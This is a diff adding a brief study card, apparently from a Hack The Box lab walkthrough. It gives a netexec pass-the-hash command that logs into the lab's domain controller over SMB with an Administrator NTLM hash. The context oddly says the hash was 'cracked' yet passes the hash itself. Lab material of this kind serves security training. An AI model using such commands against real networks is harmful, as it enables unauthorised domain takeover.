@@ -1,0 +1,9 @@
+TECHNIQUE / QUESTION:
+What is the next step after obtaining the Administrator hash?
+
+CONTEXT:
+You have successfully cracked the hash for the Administrator account.
+
+METHOD / ANSWER:
+Command: `netexec smb dc01.tombwatcher.htb -u administrator -H <hash>`
+Explanation: This command uses the administrator's NTLM hash to authenticate to the Domain Controller over SMB, allowing you to gain access without needing the plaintext password.
